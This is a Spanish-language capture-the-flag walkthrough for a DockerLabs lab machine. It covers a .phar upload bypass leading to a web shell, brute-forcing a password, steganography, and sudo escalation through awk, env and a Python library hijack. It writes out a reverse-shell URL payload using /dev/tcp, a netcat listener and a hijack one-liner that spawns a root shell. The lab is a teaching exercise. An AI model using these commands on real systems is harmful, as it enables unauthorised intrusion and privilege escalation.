
**IP**:  172.17.0.2
**S.O:** Linux
**Source:** DockeLabs
**Level:** Fácil
**Date:** 13 enero 2026
**Autor**:
**Descripción**: 

Enumeración Web
Fuzzing de directorios con gobuster
Arbitrary File Upload (Phar files) [RCE]
Brute force with created script
Estegranografia con stegseek
[[Escalada de Privilegios#**Escalada de Privilegios mediante Sudo**]] - awk, env, mediante Inyección de Comandos en un Script Sudo

**Flags**:  


**Begin**:

---
### **Reconocimiento**:

Comenzamos haciendo un ping:
![Pasted image 20260110182036.png](../../_assets/46c90ff723de0d5e835166dd946a82ca67d586acf5da090b33e2decb730abe95.png)

Escaneo de Puertos abiertos TCP
![Pasted image 20260110182054.png](../../_assets/d8c941fafa0142f4a9f745e370e6dade50ba7e7c38a58aaba86eecb74aa1ad2e.png)
Puertos abiertos: 
Puertos 22 (SSH)
Puertos 80 (HTTP)

Escaneo de versión a los puertos específicos.
![Pasted image 20260110182023.png](../../_assets/8e6876350ad73e2b93344fd8d69d0da894a7f656f47ab7a91315fbbc75a4c3a5.png)

Accedemos al servicio web
![Pasted image 20260110182126.png](../../_assets/ece3c8ffd803497eb5f6084cc474003f0da259b6d35207a308691cd46fbc8a49.png)
El servidor respondió con la página por defecto de Apache2

Realizamos un fuzzing de directorios.
![Pasted image 20260110182339.png](../../_assets/ba68d41b3ae96d331df1df24f8e2fc4d623ddb9fcdf4776fcd91aeccb2a26852.png)
Encontramos un directorio interesante llamado `fiel_upload.php`

Nos dirigimos a `172.17.0.2/file_upload.php`
![Pasted image 20260110182427.png](../../_assets/8b772a0d0d7a2d89429eb5e42a78c34577667003d3e4a7e627f3ca2151ddb776.png)
Y vemos que nos da la posibilidad de subir archivos `.php`

Subimos un archivo malicioso en `.php` que nos dará una RCE
![Pasted image 20260111180033.png](../../_assets/2acd06e1c549e2d307bdd35893d3dbadf80b23e6ff35ef6fd856e1aacdf4e7b7.png)

Y vemos que al subirlo no lo carga
![Pasted image 20260111180048.png](../../_assets/f96bd36f704ec299a86be264715c1b1fea64fb949df95a0cc4e2bb6b29c82f0e.png)
Entonces los bypasseamos con un `.phar`

Lo subimos
![Pasted image 20260111195512.png](../../_assets/b9589a0deca43570bd3396a91e7eaf7d597e8a56a3ab8fbb53f15f6e8e27cb8d.png)

Y vemos se logro subir correctamente
![Pasted image 20260111195523.png](../../_assets/53568448f174b314edc45c3d0eb94608a0a3801a164914e761707a20ce3bf816.png)

Nos dirigimos al directorio de `uploads`
![Pasted image 20260111195548.png](../../_assets/83e1d3cf056cc6de2a9deddd8a95640185a27fa858af8827b3622c8bb5c1eed2.png)

Ejecución el payload y al navegar a `http://172.17.0.2/uploads/cmd.phar?cmd=whoami`, se inyecta el comando de sistema `whoami` a través del parámetro `cmd`.
![Pasted image 20260111195737.png](../../_assets/beb2e39168dc2a556dae61276fa7fb1bab4b3c8db78f2ccdd0dac4b9c64c7b74.png)
La respuesta en la página es `www-data www-data`. Esto confirma que la web shell funciona

Ahora haremos que nos de una shell remota al puerto `4545`
```url
http://172.17.0.2/uploads/cmd.phar?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/4545%200%3E%261%22
```

Ponemos el puerto que asignamos 
```bash
nc -nvlp 4545
```

Y logramos tener una shell remota en nuestra terminal 
![Pasted image 20260111200319.png](../../_assets/9dd3e6063f930d4ceced7bc96c3782767a26c549c6edadda09b313427815cf44.png)

Realizamos el tratamiento TTY
![Pasted image 20260111200453.png](../../_assets/3d5bac7bdf3bf1e4523e4a8e903462604d710158755fd051f33623f6ac90c9df.png)

Vemos que para listar los permisos sudo tenemos que ingresar una contraseña
![Pasted image 20260111200552.png](../../_assets/8baf4ca8f3b276d529f430d0f484ca69564fd9b5e14bb59817b70da2b60b7903.png)

Listamos los directorios de `/home`
![Pasted image 20260111200611.png](../../_assets/b17fdecccf3df544a3d1c54e1e518827a7aae98b1f3dcb2e918136ee374948ae.png)

Después de buscar en varios lugares y no encontrar nada, se realizo una fuerza bruta
Para ello nos dirigimos al directorio temporal para poder realizarlo `/tmp`
```bash
cd /tmp
```

Creamos nuestro script que realizara la fuerza bruta.
![Pasted image 20260111201013.png](../../_assets/a09a205df364a76085bea6d4f7ad16d574d74fe67a13926a0b1873a5947f38fb.png)

Le damos permisos de ejecución 
![Pasted image 20260111201423.png](../../_assets/0127b8235ea103496debdcdc0ee44fca9f272d425d7ec8c887e4f7de5fc69be4.png)

Creamos el diccionario de usuarios con los usuarios del sistema
![Pasted image 20260111201355.png](../../_assets/ca7d5c055c991eb5c0eb929a796e4cce23157bf081a5662ea9083333e62ba7bb.png)

Descargamos el diccionario `rockyou` de nuestra maquina kali 
![Pasted image 20260111201500.png](../../_assets/8efba73dfaec58031fcde250d69ff455e7e6628404caecb677f7426a371d71a9.png)

Realizamos la fuerza bruta 
![Pasted image 20260111201850.png](../../_assets/4f67d59143b9c498ab30181c4b4577df4a40fa04951b3185f9e79568ba06b8e3.png)
Y encontramos la contraseña del usuario `fernando`.

Accedemos con `fernando`
Y al listar los archivos vemos que hay una archivo `.jpeg`
![Pasted image 20260111203008.png](../../_assets/243d9cbbc006657c5ad5ca9c333d775eb307542df137c95cdeead93f624a5e92.png)

Levantamos un servidor en http con `python3`
![Pasted image 20260111203138.png](../../_assets/218db8d4601102ddae7a2191ba56f9fabb717b68d7f0d262f3c325701fbbef16.png)

Desde nuestra maquina Kali descargamos la imagen.
![Pasted image 20260111203149.png](../../_assets/f15d82d53a5db3a22bef975310bef13e9bf53aafaef64d76a7857177fd2c14f3.png)

Extraeremos el archivo interno de la imagen con `stegseek`.
![Pasted image 20260111205830.png](../../_assets/1e1adbaffafc98718d40169b7f427e226c9fa32ac6afc78ae098e878fef0074f.png)
Y nos da un archivo llamado `pass.txt`

Leemos el archivo
![Pasted image 20260111205849.png](../../_assets/73c707f25c99fd17a1e7b316f8dd971444de6a9da3b93d9c5cc2abf933050beb.png)
Y nos da una cadena de texto codificada la parecer

Al analizarlo en `dcode` no dice que puede ser SHA-1
![Pasted image 20260111210301.png](../../_assets/2bb099299b683c77c864bd6d80ff06bbc9ebf78db4a965068d907c398cf3bf23.png)

Y al desencriptarlo nos da la palabra `password123`
![Pasted image 20260111210316.png](../../_assets/06b8180f6445bc8ebf9f63021f9f1b45965e2ed90a11b5c18cb52bbf9c61ce48.png)

Accedemos como el usuario `mario` con esta contraseña
![Pasted image 20260111210509.png](../../_assets/be619a2e032e9532637455d9f40d9bfd58c0fdfcaef3ee595c2d248df9115fa9.png)

Listamos los permisos sudo
![Pasted image 20260111210530.png](../../_assets/b6a06c0000a1ce76d9dd28bd702461088e8c0e9b83a4553e1360508fe9912653.png)
Y vemos que podemos ejecutar `awk` como el usuario `julen` sin contraseña 

Con el comando encontrado en GTFObins escalamos a a `julen`
![Pasted image 20260111211202.png](../../_assets/4947e95fc3881aa9eaee5c64a463121c0d4bcfd38ad2a874c35807f0032b6951.png)

Accedemos como `julen`
![Pasted image 20260111211211.png](../../_assets/3bb7c78b45028f19324059416abf982f1da4c1f1ffc7280cfe52b51dadee2e78.png)

Listamos lo permisos sudo
![Pasted image 20260111211228.png](../../_assets/077adb7924350ecdbe4c1e351dc3823820e463c457ae8c54309603f7390327a1.png)
Y vemos que podemos ejecutar `env` como el usuario `iker` sin contraseña 

Con el comando encontrado en GTFObins escalamos a `iker`
![Pasted image 20260111211318.png](../../_assets/b123f8e6945e9ca011e2103dbb00b98297e089124efe42b771c0bb029604b533.png)

Accedemos como `iker`
![Pasted image 20260111211327.png](../../_assets/9ae44ace5363a3a132a8660d5c80b4d25da0321826f7743a32da4417bbac8403.png)

Listamos lo permisos sudo
![Pasted image 20260111212450.png](../../_assets/8a2163f410dc502f2d1e7e1ece65acecdb660b9d4aa26f7d73d17b25a07c1f6d.png)
Y vemos que podemos un script  como el usuario **root** sin contraseña 

Al leer el script `geo_ip.py`.
![Pasted image 20260111213321.png](../../_assets/fd57828afc80b1ce55430a4b1bf14679a37addc4a4a522f436f538969d2e6d13.png)
Vemos que el script usa las librerias `requests`

Procederemos a hacer un: Library Hijacking
Secuestramos la libreria
Imprimimos esto en la librería en nuestro directorio actual.
```bash
echo 'import os; os.system("/bin/bash")' > /home/iker/requests.py
```

Ejecutamos el script con sudo
![Pasted image 20260111213434.png](../../_assets/3ebb1eb6ca0be0a9dc7fe7828e3f5fc9348fe6e97d6997755a21c8cff889f194.png)
Y logramos la esscalada exitosa a root.